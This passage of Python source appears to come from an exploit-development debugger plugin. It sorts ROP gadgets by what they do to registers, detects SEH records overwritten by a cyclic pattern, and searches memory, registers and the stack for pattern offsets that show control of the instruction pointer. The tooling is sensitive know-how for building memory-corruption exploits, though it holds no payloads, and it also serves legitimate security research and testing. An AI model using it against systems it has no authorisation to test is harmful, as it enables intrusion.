				pickup_allowed = ["nop","retn ","inc ","dec ","or ","xor ","mov ","lea ","add ","sub ","pop", "adc ","fpatan", "test ", "cmp "]
				pickup_allowed.append("mov "+rl+","+ptr_size_directive_l+" ss:["+r2l+"+")
				pickup_allowed.append("mov "+rl+","+ptr_size_directive_l+" ds:["+r2l+"+")
				pickup_target = ["mov "+rl+","+ptr_size_directive_l+" ss:["+r2l+"+", "mov "+rl+","+ptr_size_directive_l+" ds:["+r2l+"+"]
				pickup_notallowed = ["pop "+rl, "mov "+rl+",e", "lea "+rl+",e", "mov esp", "xor esp", "lea esp", "mov dword ptr"]
				if arch == 64:
					pickup_notallowed.extend(["mov rsp", "xor rsp", "lea rsp", "mov qword ptr"])
				for gadget in ropchains:
					gadgetinstructions = ropchains[gadget].strip().lower()
					allowedpickup = False
					for allowed in pickup_target:
						if gadgetinstructions.find(allowed) == 2 and gadgetinstructions.count(ptr_size_directive_l) == 1:
							allowedpickup = True
							break
					if allowedpickup:
						if suggestedGadgetCheck(gadgetinstructions,pickup_allowed,pickup_notallowed):
							toadd={}
							toadd[gadget] = ropchains[gadget].strip()
							resulthash = "pickup pointer into "+rl
							if not resulthash in suggestions:
								suggestions[resulthash] = toadd
							else:
								suggestions[resulthash] = mergeOpcodes(suggestions[resulthash],toadd)
							if not r in pickedupin:
								pickedupin.append(r)
	# move pointer into another pointer
	# =================================
	for reg in arch_aware_regs:	#from
		for reg2 in arch_aware_regs:	#to
			if reg != reg2:
				reg2l = reg2.lower()
				moveptr_allowed = ["nop","retn","pop ","inc ","dec ","or ","xor ","add ","push ","and ", "xchg ", "adc ","fpatan", "test ", "cmp "]
				moveptr_notallowed = ["pop "+reg2l,"mov "+reg2l+",","xchg "+reg2l+",","xor "+reg2l,"lea "+reg2l+",","and "+reg2l,"ds:","ss:","pushad","popad", "dec esp", "dec rsp"]
				suggestions = mergeOpcodes(suggestions,getRegToReg("move",reg,reg2,ropchains,moveptr_allowed,moveptr_notallowed))
				# if we didn't find any, expand the search
				if not ("move " + reg + " -> " + reg2).lower() in suggestions:
					moveptr_allowed = ["nop","retn","pop ","inc ","dec ","or ","xor ","add ","push ","and ", "xchg ", "adc ","fpatan", "test ", "cmp "]
					moveptr_notallowed = ["pop "+reg2l,"mov "+reg2l+",","xchg "+reg2l+",","xor "+reg2l,"lea "+reg2l+",","and "+reg2l,"pushad","popad", "dec esp", "dec rsp"]
					suggestions = mergeOpcodes(suggestions,getRegToReg("move",reg,reg2,ropchains,moveptr_allowed,moveptr_notallowed))

		reg2 = STACK_POINTER	#special case
		if reg != reg2:
			reg2l = reg2.lower()
			moveptr_allowed = ["nop","retn","pop ","inc ","dec ","or ","xor ","add ","push ","and ", "mov ", "xchg ", "adc ", "test ", "cmp "]
			moveptr_notallowed = ["add "+reg2l, "adc "+reg2l, "pop "+reg2l,"mov "+reg2l+",","xchg "+reg2l+",","xor "+reg2l,"lea "+reg2l+",","and "+reg2l,"ds:","ss:","pushad","popad", "dec esp", "dec rsp"]
			suggestions = mergeOpcodes(suggestions,getRegToReg("move",reg,reg2,ropchains,moveptr_allowed,moveptr_notallowed))

	# xor pointer into another pointer
	# =================================
	for reg in arch_aware_regs:	#from
		for reg2 in arch_aware_regs:	#to
			if reg != reg2:
				reg2l = reg2.lower()
				xorptr_allowed = ["nop","retn","pop ","inc ","dec ","or ","xor ","add ","push ","and ", "xchg ", "adc ","fpatan", "test ", "cmp "]
				xorptr_notallowed = ["pop "+reg2l,"mov "+reg2l+",","xchg "+reg2l+",","xor "+reg2l,"lea "+reg2l+",","and "+reg2l,"ds:","ss:","pushad","popad", "dec esp", "dec rsp"]
				suggestions = mergeOpcodes(suggestions,getRegToReg("xor",reg,reg2,ropchains,xorptr_allowed,xorptr_notallowed))
	# get stack pointer
	# =================
	for reg in arch_aware_regs:
		regl = reg.lower()
		moveptr_allowed = ["nop","retn","pop ","inc ","dec ","or ","xor ","add ","push ","and ","mov ", "adc ","fpatan", "test ", "cmp "]
		moveptr_notallowed = ["pop esp","mov esp,","xchg esp,","xor esp","lea esp,","and esp", "add esp", "],","sub esp","or esp",
		                      "pop "+regl,"mov "+regl,"xchg "+regl,"xor "+regl,"lea "+regl,"and "+regl]
		suggestions = mergeOpcodes(suggestions,getRegToReg("move",STACK_POINTER,reg,allchains,moveptr_allowed,moveptr_notallowed))
	# add something to register
	# =========================
	for reg in arch_aware_regs:	#from
		for reg2 in arch_aware_regs:	#to
			if reg != reg2:
				reg2l = reg2.lower()
				moveptr_allowed = ["nop","retn","pop ","inc ","dec ","or ","xor ","add ","push ","and ", "adc ","fpatan", "test ", "cmp "]
				moveptr_notallowed = ["pop "+reg2l,"mov "+reg2l+",","xchg "+reg2l+",","xor "+reg2l,"lea "+reg2l+",","and "+reg2l,"ds:","ss:", "dec esp", "dec rsp"]
				suggestions = mergeOpcodes(suggestions,getRegToReg("add",reg,reg2,ropchains,moveptr_allowed,moveptr_notallowed))
	# add value to register
	# =========================
	for reg in regs:	#to
		regl = reg.lower()
		moveptr_allowed = ["nop","retn","pop ","inc ","dec ","or ","xor ","add ","push ","and ", "adc ", "sub ","fpatan", "test ", "cmp "]
		moveptr_notallowed = ["pop "+regl,"mov "+regl+",","xchg "+regl+",","xor "+regl,"lea "+regl+",","ds:","ss:", "dec esp", "dec rsp"]
		suggestions = mergeOpcodes(suggestions, getRegToReg("addval",reg,reg,ropchains,moveptr_allowed,moveptr_notallowed))

	#inc reg
	# =======
	for reg in regs:
		regl = reg.lower()
		moveptr_allowed = ["nop","retn","pop ","inc " + regl,"dec ","or ","xor ","add ","push ","and ", "adc ", "sub ","fpatan", "test ", "cmp "]
		moveptr_notallowed = ["pop "+regl,"mov "+regl+",","xchg "+regl+",","xor "+regl,"lea "+regl+",","ds:","ss:", "dec esp", "dec rsp", "dec "+regl]
		suggestions = mergeOpcodes(suggestions,getRegToReg("inc",reg,reg,ropchains,moveptr_allowed,moveptr_notallowed))

	#dec reg
	# =======
	for reg in regs:
		regl = reg.lower()
		moveptr_allowed = ["nop","retn","pop ","dec " + regl,"inc ","or ","xor ","add ","push ","and ", "adc ", "sub ","fpatan", "test ", "cmp "]
		moveptr_notallowed = ["pop "+regl,"mov "+regl+",","xchg "+regl+",","xor "+regl,"lea "+regl+",","ds:","ss:", "dec esp", "dec rsp", "inc "+regl]
		suggestions = mergeOpcodes(suggestions,getRegToReg("dec",reg,reg,ropchains,moveptr_allowed,moveptr_notallowed))
	#popad reg
	# =======
	if arch == 32:
		popad_allowed = ["popad","retn","inc ","dec ","or ","xor ","add ","and ", "adc ", "sub ","fpatan","pop ", "test ", "cmp "]
		popad_notallowed = ["pop esp","push esp","mov esp","add esp", "inc esp","dec esp","xor esp","lea esp","ss:","ds:"]
		for gadget in ropchains:
			gadgetinstructions = ropchains[gadget].strip().lower()
			if gadgetinstructions.find("popad") == 2:
				if suggestedGadgetCheck(gadgetinstructions,popad_allowed,popad_notallowed):
					toadd={}
					toadd[gadget] = ropchains[gadget].strip()
					if not "popad" in suggestions:
						suggestions["popad"] = toadd
					else:
						suggestions["popad"] = mergeOpcodes(suggestions["popad"],toadd)
	# pop
	# ===
	for reg in regs:
		regl = reg.lower()
		pop_allowed = "pop "+regl+" # retn"
		pop_notallowed = []
		for gadget in ropchains:
			gadgetinstructions = ropchains[gadget].strip().lower()
			if gadgetinstructions.find(pop_allowed) == 2:
				resulthash = "pop "+regl
				toadd = {}
				toadd[gadget] = ropchains[gadget].strip()
				if not resulthash in suggestions:
					suggestions[resulthash] = toadd
				else:
					suggestions[resulthash] = mergeOpcodes(suggestions[resulthash],toadd)
	# check if we have a pop for each reg
	for reg in regs:
		r = reg.lower()
		if not "pop "+r in suggestions:
			pop_notallowed = ["mov "+r+",","xchg "+r+",","xor "+r,"lea "+r+",","ds:","ss:", "dec esp", "dec "+r, "inc " + r,"push ","xor "+r]
			if arch == 64:
				pop_notallowed.append("dec rsp")
				pop_notallowed.append("sub rsp")
			for rchain in ropchains:
				rparts = ropchains[rchain].strip().lower().split("#")
				chainok = False
				if len(rparts) > 1 and rparts[1].strip() == "pop " + r:
						chainok = True
				if chainok:
					for rpart in rparts:
						thisinstr = rpart.strip()
						for pna in pop_notallowed:
							if thisinstr.find(pna) > -1:
								chainok = False
								break
						if not chainok:
							break
				if chainok:
					toadd = {}
					toadd[rchain] = ropchains[rchain].strip()
					if not "pop " + r in suggestions:
						suggestions["pop " + r] = toadd
					else:
						suggestions["pop " + r] = mergeOpcodes(suggestions["pop " + r],toadd)
	# neg
	# ===
	for reg in regs:
		regl = reg.lower()
		neg_allowed = "neg "+regl+" # retn"
		neg_notallowed = []
		for gadget in ropchains:
			gadgetinstructions = ropchains[gadget].strip().lower()
			if gadgetinstructions.find(neg_allowed) == 2:
				resulthash = "neg "+regl
				toadd = {}
				toadd[gadget] = ropchains[gadget].strip()
				if not resulthash in suggestions:
					suggestions[resulthash] = toadd
				else:
					suggestions[resulthash] = mergeOpcodes(suggestions[resulthash],toadd)
	# empty
	# =====
	for reg in regs:
		regl = reg.lower()
		empty_allowed = ["xor "+regl+","+regl+" # retn","mov "+regl+",ffffffff # inc "+regl+" # retn", "sub "+regl+","+regl+" # retn", "push 0 # pop "+regl + " # retn", "imul "+regl+","+regl+",0 # retn", "and "+regl+", 0 # retn", "mov "+regl+", 0 # retn"]
		empty_notallowed = []
		for gadget in ropchains:
			gadgetinstructions = ropchains[gadget].strip().lower()
			for empty in empty_allowed:
				if gadgetinstructions.find(empty) == 2:
					resulthash = "clear "+regl
					toadd = {}
					toadd[gadget] = ropchains[gadget].strip()
					if not resulthash in suggestions:
						suggestions[resulthash] = toadd
					else:
						suggestions[resulthash] = mergeOpcodes(suggestions[resulthash],toadd)
	return suggestions


def getRegToReg(type,fromreg,toreg,ropchains,moveptr_allowed,moveptr_notallowed):
	moveptr = []
	instrwithout = ""
	toreg = toreg.lower()
	fromreg = fromreg.lower()
	toregl = toreg.lower()
	fromregl = fromreg.lower()
	srcval = False
	resulthash = ""
	musthave = ""
	if type == "move":
		moveptr.append("mov "+toregl+","+fromregl)
		#moveptr.append("lea "+toregl+", ["+fromregl+"+")
		#if not (fromreg == "ESP" or toreg == "ESP"):
		moveptr.append("xchg "+fromregl+","+toregl)
		moveptr.append("xchg "+toregl+","+fromregl)
		moveptr.append("push "+fromregl)
		moveptr.append("add "+toregl+","+fromregl)
		moveptr.append("adc "+toregl+","+fromregl)
		moveptr.append("xor "+toregl+","+fromregl)
	if type == "xor":
		moveptr.append("xor "+toregl+","+fromregl)
	if type == "add":
		moveptr.append("add "+toregl+","+fromregl)
		moveptr.append("adc "+toregl+","+fromregl)
		moveptr.append("xor "+toregl+","+fromregl)
	if type == "addval":
		moveptr.append("add "+toregl+",")
		moveptr.append("adc "+toregl+",")
		moveptr.append("xor "+toregl+",")
		moveptr.append("sub "+toregl+",")
		srcval = True
		resulthash = "add value to " + toregl
	if type == "inc":
		moveptr.append("inc "+toregl)
		resulthash = "inc " + toregl
	if type == "dec":
		moveptr.append("dec "+toregl)
		resulthash = "dec " + toregl
	results = {}
	if resulthash == "":
		resulthash = type +" "+fromreg+" -> "+toreg
	resulthash = resulthash.lower()
	for tocheck in moveptr:
		origtocheck = tocheck
		for gadget in ropchains:
			gadgetinstructions = ropchains[gadget].strip().lower()
			if gadgetinstructions.find(tocheck) == 2:
				moveon = True
				if srcval:
					#check if src is a value
					inparts = gadgetinstructions.split(",")
					if len(inparts) > 1:
						subinparts = inparts[1].split(" ")
						if isHexString(subinparts[0].strip()):
							tocheck = tocheck + subinparts[0].strip()
						else:
							moveon = False
				if moveon:
					instrwithout = gadgetinstructions.replace(tocheck,"")
					if tocheck == "push "+fromregl:
						popreg = instrwithout.find("pop "+toregl)
						popall = instrwithout.find("pop")
						#make sure pop matches push
						nrpush = gadgetinstructions.count("push ")
						nrpop = gadgetinstructions.count("pop ")
						pushpopmatch = False
						if nrpop >= nrpush:
							pushes = []
							pops = []
							ropparts = gadgetinstructions.split(" # ")
							pushindex = 0
							popindex = 0
							cntpush = 0
							cntpop = nrpush
							for parts in ropparts:
								if parts.strip() != "":
									if parts.strip().find("push ") > -1:
										pushes.append(parts)
										if parts.strip() == "push "+fromregl:
											cntpush += 1
									if parts.strip().find("pop ") > -1:
										pops.append(parts)
										if parts.strip() == "pop "+toregl:
											cntpop -= 1
							if cntpush == cntpop:
								#dbg.log("%s : POPS : %d, PUSHES : %d, pushindex : %d, popindex : %d" % (gadgetinstructions,len(pops),len(pushes),pushindex,popindex))
								#dbg.log("push at %d, pop at %d" % (cntpush,cntpop))
								pushpopmatch = True
						if (popreg == popall) and instrwithout.count("pop "+toregl) == 1 and pushpopmatch:
							toadd={}
							toadd[gadget] = ropchains[gadget].strip()
							if not resulthash in results:
								results[resulthash] = toadd
							else:
								results[resulthash] = mergeOpcodes(results[resulthash],toadd)
					else:
						if suggestedGadgetCheck(instrwithout,moveptr_allowed,moveptr_notallowed):
							toadd={}
							toadd[gadget] = ropchains[gadget].strip()
							if not resulthash in results:
								results[resulthash] = toadd
							else:
								results[resulthash] = mergeOpcodes(results[resulthash],toadd)
			tocheck = origtocheck
	return results


def suggestedGadgetCheck(instructions,allowed,notallowed):
	individual = instructions.split("#")
	cnt = 0
	allgood = True
	toskip = False
	while (cnt < len(individual)-1) and allgood:	# do not check last one, which is the ending instruction
		thisinstr = individual[cnt].lower()
		if thisinstr.strip() != "":
			toskip = False
			foundinstruction = False
			for notok in notallowed:
				if thisinstr.find(notok) > -1:
					toskip= True 
			if not toskip:
				for ok in allowed:
					if thisinstr.find(ok) > -1:
						foundinstruction = True
				allgood = foundinstruction
			else:
				allgood = False
		cnt += 1
	return allgood

def dumpMemoryToFile(address,size,filename):
	"""
	Dump 'size' bytes of memory to a file
	
	Arguments:
	address  - the address where to read
	size     - the number of bytes to read
	filename - the name of the file where to write the file
	
	Return:
	Boolean - True if the write succeeded
	"""

	WRITE_SIZE = 10000
	
	dbg.log("Dumping %d bytes from address 0x%08x to %s..."	% (size, address, filename))
	out = open(filename,'wb')
	
	# write by increments of 10000 bytes
	current = 0
	while current < size :
		bytesToWrite = size - current
		if ( bytesToWrite >= WRITE_SIZE):
			bytes = dbg.readMemory(address+current,WRITE_SIZE)
			out.write(bytes)
			current += WRITE_SIZE
		else:
			bytes = dbg.readMemory(address+current,bytesToWrite)
			out.write(bytes)
			current += bytesToWrite
	out.close()
	
	return True

def checkSEHOverwrite(address, nseh, seh):
	"""
	Checks if the current SEH record is overwritten
	with a cyclic pattern
	Input : address of SEH record, nseh value, seh value
	Returns : array.  Non empty array = SEH is overwritten
	Array contents :
	[0] : type  (normal, upper, lower, unicode)
	[1] : offset to nseh
	"""
	pattypes = ["normal","upper","lower","unicode"]
	overwritten = []
	global silent
	silent = True

	fullpattern = createPattern(50000,{})
	for pattype in pattypes:	
		regpattern = fullpattern
		hexpat = toHex(seh)
		hexpat = toAscii(hexpat[6]+hexpat[7])+toAscii(hexpat[4]+hexpat[5])+toAscii(hexpat[2]+hexpat[3])+toAscii(hexpat[0]+hexpat[1])
		factor = 1
		goback = 4
		if pattype == "upper":
			regpattern = regpattern.upper()
		if pattype == "lower":
			regpattern = regpattern.lower()
		if pattype == "unicode":
			hexpat = dbg.readMemory(address,8)
			hexpat = hexpat.replace(b"\x00",b"")
			goback = 2
		offset = ensure_bytes(regpattern).find(ensure_bytes(hexpat)) - goback
		#offset = regpattern.find(hexpat)-goback
		thissize = 0
		if offset > -1:		
			thepointer = MnPointer(address)
			if thepointer.isOnStack():
				thissize = getPatternLength(address+4,pattype)
				if thissize > 0:
					overwritten = [pattype,offset]
					break
	silent = False
	return overwritten



def goFindMSP(distance=0, args=None):
	"""
	Finds all references to cyclic pattern in memory

	Arguments:
	None

	Return:
	Dictionary with results of the search operation
	"""
	if args is None:
		args = {}

	results = {}
	regs = getRegisters()
	criteria = {}
	criteria["accesslevel"] = "*"

	tofile = ""

	global silent
	oldsilent = silent
	silent = True

	# keep text version for searchInRange() / older helper functions
	fullpattern = createPattern(50000, args)
	# use bytes version when comparing with dbg.readMemory()
	fullpattern_bytes = ensure_bytes(fullpattern)

	# are we attached to an application ?
	if dbg.getDebuggedPid() == 0:
		silent = oldsilent
		dbg.log("*** Attach to an application, and trigger a crash with a cyclic pattern ! ***", highlight=1)
		return {}

	# 1. find beginning of cyclic pattern in memory ?
	# keep as text because searchInRange() expects text
	patbegin = createPattern(6, args)

	silent = oldsilent
	pattypes = ["normal", "unicode", "lower", "upper"]
	if not silent:
		dbg.log("[+] Looking for the first 6 characters of the cyclic pattern in memory")
	tofile += "[+] Looking for cyclic pattern in memory\n"

	for pattype in pattypes:
		dbg.updateLog()
		searchPattern = []
		interruptMona()
		dbg.log("")
		dbg.log("    Searching for %s pattern:" % pattype)

		# create search pattern (TEXT, not bytes)
		if pattype == "normal":
			searchPattern.append([patbegin, patbegin])

		if pattype == "unicode":
			patbegin_unicode = ""
			for pbyte in patbegin:
				patbegin_unicode += pbyte + "\x00"
			searchPattern.append([patbegin_unicode, patbegin_unicode])

		if pattype == "lower":
			searchPattern.append([patbegin.lower(), patbegin.lower()])

		if pattype == "upper":
			searchPattern.append([patbegin.upper(), patbegin.upper()])

		# search
		pointers = searchInRange(searchPattern, 0, TOP_USERLAND, criteria)
		memory = {}

		if len(pointers) > 0:
			for ptrtypes in pointers:
				for ptr in pointers[ptrtypes]:
					# get size

					thisptr = MnPointer(ptr)
					ptrinfo = ""
					if thisptr.isOnStack():
						ptrinfo = "[<b>Stack</b>]"
					elif thisptr.isInHeap():
						ptrinfo = "[<b>Heap</b>]"
					thissize = getPatternLength(ptr, pattype, args)
					if thissize > 0:
						if not silent:
							dbg.log("    Cyclic pattern (%s) found at 0x%s (length %d bytes) %s" % (pattype, toHex(ptr), thissize, ptrinfo))
						tofile += "    Cyclic pattern (%s) found at 0x%s (length %d bytes) %s \n" % (pattype, toHex(ptr), thissize, ptrinfo)
						if ptr not in memory:
							memory[ptr] = [thissize, pattype]

					# get distance from SP
					if STACK_POINTER in regs:
						thissp = regs[STACK_POINTER]
						if thisptr.isOnStack():
							if ptr > thissp:
								if not silent:
									dbg.log("    \\_ Add between %d & %d bytes to %s in order to land in this pattern" % (ptr - thissp, ptr - thissp + thissize, STACK_POINTER))
								tofile += "    \\_ Add between %d & %d bytes to %s in order to land in this pattern\n" % (ptr - thissp, ptr - thissp + thissize, STACK_POINTER)

			if "memory" not in results:
				results["memory"] = memory

	# 2. registers overwritten ?
	if not silent:
		dbg.log("")
		dbg.log("[+] Examining registers")
	tofile += "\n[+] Examining registers\n"

	registers = {}
	registers_to = {}

	for reg in regs:
		for pattype in pattypes:
			dbg.updateLog()

			regpattern = fullpattern_bytes

			if pattype == "upper":
				regpattern = fullpattern_bytes.upper()
			if pattype == "lower":
				regpattern = fullpattern_bytes.lower()
			if pattype == "unicode":
				regpattern = ensure_bytes(toUnicode(fullpattern))

			# Pack register value as raw bytes
			try:
				regbytes = struct.pack(PTR_FMT, regs[reg] & ((1 << (PTR_SIZE * 8)) - 1))
			except:
				regbytes = b""

			# Try full pointer width, then low 4 bytes
			candidates = []
			if PTR_SIZE == 8 and len(regbytes) == 8:
				candidates.append((regbytes, False))
				candidates.append((regbytes[::-1], True))
				candidates.append((regbytes[:4], False))
				candidates.append((regbytes[:4][::-1], True))
			elif len(regbytes) == 4:
				candidates.append((regbytes, False))
				candidates.append((regbytes[::-1], True))

			for regcand, is_reversed in candidates:
				offset = regpattern.find(regcand)
				if offset > -1:
					if pattype == "unicode":
						offset = offset // 2

					regname = reg
					if reg == PROGRAM_COUNTER:
						regname = "<b>%s</b>" % reg

					if not silent:
						if is_reversed:
							dbg.log("    %s contains %s pattern (reversed) : 0x%s (offset %d)" % (regname, pattype, toHex(regs[reg]), offset))
						else:
							dbg.log("    %s contains %s pattern : 0x%s (offset %d)" % (regname, pattype, toHex(regs[reg]), offset))


					if is_reversed:
						tofile += "    %s contains %s pattern (reversed) : 0x%s (offset %d)\n" % (regname, pattype, toHex(regs[reg]), offset)
					else:
						tofile += "    %s contains %s pattern : 0x%s (offset %d)\n" % (regname, pattype, toHex(regs[reg]), offset)

					if reg not in registers:
						registers[reg] = [regs[reg], offset, pattype]
					break

			# maybe register points into cyclic pattern
			mempat = b""
			try:
				mempat = dbg.readMemory(regs[reg], 4)
			except:
				pass

			if mempat != b"":
				if pattype == "normal":
					regpattern = fullpattern_bytes
				if pattype == "upper":
					regpattern = fullpattern_bytes.upper()
				if pattype == "lower":
					regpattern = fullpattern_bytes.lower()
				if pattype == "unicode":
					regpattern = ensure_bytes(toUnicode(fullpattern))
					mempat = dbg.readMemory(regs[reg], 8)
					mempat = mempat.replace(b"\x00", b"")

				offset = regpattern.find(mempat)

				if offset > -1:
					if pattype == "unicode":
						offset = offset // 2

					thissize = getPatternLength(regs[reg], pattype, args)
					if thissize > 0:
						if not silent:
							dbg.log("    <b>%s</b> (0x%s) points at offset <b>%d</b> in %s pattern (length %d) <- trampoline?" % (reg, toHex(regs[reg]), offset, pattype, thissize))
						tofile += "    %s (0x%s) points at offset %d in %s pattern (length %d) <- trampoline?\n" % (reg, toHex(regs[reg]), offset, pattype, thissize)
						registers_to[reg] = [regs[reg], offset, thissize, pattype]
				else:
					# reversed ?
					offset = regpattern.find(mempat[::-1])
					if offset > -1:
						if pattype == "unicode":
							offset = offset // 2

						thissize = getPatternLength(regs[reg], pattype, args)
						if thissize > 0:
							if not silent:
								dbg.log("    <b>%s</b> (0x%s) points at offset <b>%d</b> in (reversed) %s pattern (length %d) <- trampoline?" % (reg, toHex(regs[reg]), offset, pattype, thissize))
							tofile += "    %s (0x%s) points at offset %d in (reversed) %s pattern (length %d) <- trampoline?\n" % (reg, toHex(regs[reg]), offset, pattype, thissize)
							registers_to[reg] = [regs[reg], offset, thissize, pattype]

	if arch == 64:
		if STACK_POINTER in registers_to and not PROGRAM_COUNTER in registers:
			rip_val = regs[PROGRAM_COUNTER]
			rsp_val = regs[STACK_POINTER]
			opc = dbglib.opcode(rip_val)
			opc_instruction = opc.getDisasm()
			if opc.isRet():
				dbg.log("")
				warningline = "    Warning! This is 64bit, %s points into pattern, and %s is about to execute '%s'" % (STACK_POINTER, PROGRAM_COUNTER, opc_instruction)
				dbg.log(warningline)
				tofile += "%s\n" % warningline

				# bingo. Get the possible offset due to calling conventions
				# (unlikely on 64bit, but you never know)
				dbgp("Instruction at %s: %s" % ((PTR_PRINT % rsp_val), opc_instruction))
				rip_offset = registers_to[STACK_POINTER][1]
				rip_patterntype = registers_to[STACK_POINTER][3]

				# what is at rsp right now, is what rip will become
				adjust_rsp = 8	# default for ret
				extra_adjust = getOffset(opc_instruction)
				total_adjust = adjust_rsp + extra_adjust
				dbgp("Extra adjustment for retn offset instruction: %d" % total_adjust)

				warningline = "    That means we control <b>%s</b>, and %s will be adjusted with 0x%x bytes after the '%s' instruction" % (PROGRAM_COUNTER, STACK_POINTER, total_adjust, opc_instruction)
				dbg.log(warningline)
				tofile += "%s\n" % warningline	

				try:
					value_on_stack = struct.unpack(PTR_FMT,dbg.readMemory(rsp_val,PTR_SIZE))[0]
					registers[PROGRAM_COUNTER] = [value_on_stack, rip_offset, rip_patterntype]
					warningline = "      -> We control <b>%s</b> at offset <b>%d</b> in %s pattern" % (PROGRAM_COUNTER, rip_offset, rip_patterntype)
					dbg.log(warningline)
					tofile += "%s\n" % warningline		
					# the stack pointer itself will change, and this its position and length also
					rsp_offset = rip_offset + total_adjust
					rsp_val = regs[STACK_POINTER] + total_adjust
					rsp_size = registers_to[STACK_POINTER][2] - total_adjust
					registers_to[STACK_POINTER] = [rsp_val, rsp_offset, rsp_size, rip_patterntype]
					warningline = "      -> <b>%s will become %s, and then points at offset <b>%d</b> in %s pattern (length %d) <- trampoline?" % (STACK_POINTER, (PTR_PRINT % rsp_val), rsp_offset, rip_patterntype,  rsp_size)
					dbg.log(warningline)
					tofile += "%s\n" % warningline
				except Exception as e:
					warningline = "      *** Could not read memory at %s to confirm control over %s: %s" % ((PTR_PRINT % rsp_val), PROGRAM_COUNTER, str(e))
					dbg.log(warningline)
					tofile += "%s\n" % warningline

	if "registers" not in results:
		results["registers"] = registers
	if "registers_to" not in results:
		results["registers_to"] = registers_to

	# 3. SEH record overwritten ?
	# SEH chain logic is x86-only in this form, so skip entirely on x64

	seh = {}
	if PTR_SIZE == 4:
		if not silent:
			dbg.logLines("\n[+] Examining SEH chain")
		tofile += "\n[+] Examining SEH chain\n"
		thissehchain = dbg.getSehChain()

		for chainentry in thissehchain:
			address = chainentry[0]
			sehandler = chainentry[1]
			nseh = 0
			nsehvalue = 0
			nsehascii = b""
			try:
				nsehascii = dbg.readMemory(address, 4)
				nsehvalue = struct.unpack('<L', nsehascii)[0]
				nseh = "%08x" % nsehvalue
			except:
				nseh = 0
				sehandler = 0

			if nseh != 0:
				for pattype in pattypes:
					dbg.updateLog()
					regpattern = fullpattern_bytes
					hexpat = nsehascii
					takeout = 4
					divide = 1

					if pattype == "upper":
						regpattern = fullpattern_bytes.upper()
					if pattype == "lower":
						regpattern = fullpattern_bytes.lower()
					if pattype == "unicode":
						regpattern = ensure_bytes(toUnicode(fullpattern))
						# get next 4 bytes too
						nsehascii = dbg.readMemory(address, 8)
						hexpat = nsehascii.replace(b"\x00", b"")
						takeout = 0
						divide = 2

					offset = regpattern.find(hexpat)
					thissize = 0

					if offset > -1:
						thepointer = MnPointer(chainentry[0])
						if thepointer.isOnStack():
							thissize = getPatternLength(address + 4, pattype, args)
							if thissize > 0:
								thissize = (thissize - takeout) // divide
								if pattype == "unicode":
									offset = offset // 2

								if not silent:
									dbg.log("    SEH record (nseh field) at 0x%s overwritten with %s pattern : 0x%s (offset <b>%d</b>), followed by %d bytes of cyclic data after the handler" % (toHex(chainentry[0]), pattype, nseh, offset, thissize))
								tofile += "    SEH record (nseh field) at 0x%s overwritten with %s pattern : 0x%s (offset %d), followed by %d bytes of cyclic data after the handler\n" % (toHex(chainentry[0]), pattype, nseh, offset, thissize)

								if (chainentry[0] + 4) not in seh:
									seh[chainentry[0] + 4] = [chainentry[1], offset, pattype, thissize]

	if "seh" not in results:
		results["seh"] = seh

	stack = {}
	stackcontains = {}

	# 4. walking stack
	if STACK_POINTER in regs:
		curresp = regs[STACK_POINTER]

		if not silent:
			if distance == 0:
				extratxt = "(entire stack)"
			else:
				extratxt = "(+- " + str(distance) + " bytes)"
			dbg.log("")
			dbg.log("[+] Examining stack %s - looking for cyclic pattern" % extratxt)
		tofile += "\n[+] Examining stack %s - looking for cyclic pattern\n" % extratxt

		# get stack this address belongs to
		stacks = getStacks()
		dbgp("Finding stack that has current value of %s : %s" % (STACK_POINTER, PTR_PRINT % curresp))

		thisstackbase = 0
		thisstacktop = 0

		if distance < 1:
			for tstack in stacks:
				dbgp("Stack %d : %s - %s" % (tstack, (PTR_PRINT % stacks[tstack][0]), (PTR_PRINT % stacks[tstack][1])))
				if (stacks[tstack][0] < curresp) and (curresp < stacks[tstack][1]):
					thisstackbase = stacks[tstack][0]
					thisstacktop = stacks[tstack][1]
		else:
			thisstackbase = curresp - distance
			thisstacktop = curresp + distance + PTR_SIZE

		stackcounter = thisstackbase
		sign = ""

		if not silent:
			dbg.log("    Walking stack from 0x%s to 0x%s (0x%s bytes)" % (toHex(stackcounter), toHex(thisstacktop - PTR_SIZE), toHex(thisstacktop - PTR_SIZE - stackcounter)))
		tofile += "    Walking stack from 0x%s to 0x%s (0x%s bytes)\n" % (toHex(stackcounter), toHex(thisstacktop - PTR_SIZE), toHex(thisstacktop - PTR_SIZE - stackcounter))

		# stack contains part of a cyclic pattern ?
		while stackcounter < thisstacktop - PTR_SIZE:
			espoffset = stackcounter - curresp
			stepsize = PTR_SIZE
			dbg.updateLog()

			if espoffset > -1:
				sign = "+"
			else:
				sign = "-"

			cont = dbg.readMemory(stackcounter, 4)

			if len(cont) == 4:
				contat = cont
				if contat != b"":
					for pattype in pattypes:
						dbg.updateLog()
						regpattern = fullpattern_bytes
						hexpat = contat

						if pattype == "upper":
							regpattern = fullpattern_bytes.upper()
						if pattype == "lower":
							regpattern = fullpattern_bytes.lower()
						if pattype == "unicode":
							regpattern = ensure_bytes(toUnicode(fullpattern))
							hexpat1 = dbg.readMemory(stackcounter, 4)
							hexpat2 = dbg.readMemory(stackcounter + 4, 4)
							hexpat1 = hexpat1.replace(b"\x00", b"")
							hexpat2 = hexpat2.replace(b"\x00", b"")
							if hexpat1 == b"" or hexpat2 == b"":
								# no unicode
								hexpat = b""
								break
							else:
								hexpat = hexpat1 + hexpat2

						if len(hexpat) == 4:
							offset = regpattern.find(hexpat)
							currptr = stackcounter

							if offset > -1:
								if pattype == "unicode":
									offset = offset // 2

								thissize = getPatternLength(currptr, pattype, args)
								offsetvalue = abs(espoffset)
								if thissize > 0:
									stepsize = thissize
									if (thissize % PTR_SIZE) != 0:
										stepsize = ((thissize // PTR_SIZE) * PTR_SIZE) + PTR_SIZE

									if not silent:
										espoff = 0
										espsign = "+"
										if ((stackcounter + thissize) >= curresp):
											espoff = (stackcounter + thissize) - curresp
										else:
											espoff = curresp - (stackcounter + thissize)
											espsign = "-"

										dbg.log("    0x%s : Contains %s cyclic pattern at %s%s0x%s (%s%s) : offset %d, length %d (-> 0x%s : %s%s0x%s)" % (
												(PTR_PRINT % stackcounter), pattype, STACK_POINTER, sign, rmLeading(toHex(offsetvalue), "0"),
												sign, offsetvalue, offset, thissize,
												(PTR_PRINT % (stackcounter + thissize - 1)), STACK_POINTER, espsign, rmLeading(toHex(espoff), "0")))

									tofile += "    0x%s : Contains %s cyclic pattern at %s%s0x%s (%s%s) : offset %d, length %d (-> 0x%s : %s%s0x%s)\n" % (
